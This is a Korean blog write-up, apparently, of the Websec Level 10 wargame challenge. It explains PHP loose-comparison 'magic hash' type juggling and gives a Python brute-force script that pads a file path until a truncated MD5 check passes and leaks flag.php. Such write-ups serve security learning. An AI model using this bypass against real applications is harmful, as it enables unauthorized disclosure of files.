---
title : "Websec - Level 10"
excerpt : "Websec - Easy Level 10 (풀이봄..)"
toc: true
toc_sticky: true
categories:
  - Websec
tags:
  - type juggling
  - magic hash
---

## 1. Source code
<img src="/assets/images/websec-level 10.jpg">
``` php
if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
    $file = $_REQUEST['f'];
    $request = $_REQUEST['hash']; // default: substr(md5($flag.'index.php'.$flag),0,8) -> b4382d64
    $hash = substr (md5 ($flag . $file . $flag), 0, 8);
    echo '<div class="row"><br><pre>';
    if ($request == $hash) {
        show_source ($file);
    } 
    else {
        echo 'Permission denied!';
    }
    echo '</pre></div>';
}
```

## 2. Vulnerability

flag.php 파일을 확인을 해야하므로 $file 값은 flag.php가 되고, 입력한 해쉬 값과 $hash 변수 값을 비교하는 부분을 통과를 해야함.  
여기서 **magic hash**란 것이 있다. md5 해쉬 암호화를 했을 때, 0e1234 이런 식으로 암호화 되는 경우가 있는데 0e로 시작하면 그 값은 0과 같음. 이 점을 이용해서 풀 수 있음.


## 3. Solution
파일 이름에 따라 $hash 값이 바뀌게 되는데 flag.php 파일은 읽어야 되므로 '.' 과 '/'을 붙여줘서 브루트 포스를 하면 됨. 한 870번 조금 넘어설때 쯤 됨.


```python
import requests

url='http://websec.fr/level10/index.php'
string='flag.php';
headers={'Content-Type':'application/x-www-form-urlencoded'}
for i in range(1,1000) :
    data={'f':string,'hash':0}
    res=requests.post(url,data=data,headers=headers)
    if("Permission denied!" not in res.text):
        print(res.text)
        break
    print("fail.. "+str(i)+" trying")
    string='.'+'/'*i+'flag.php'
```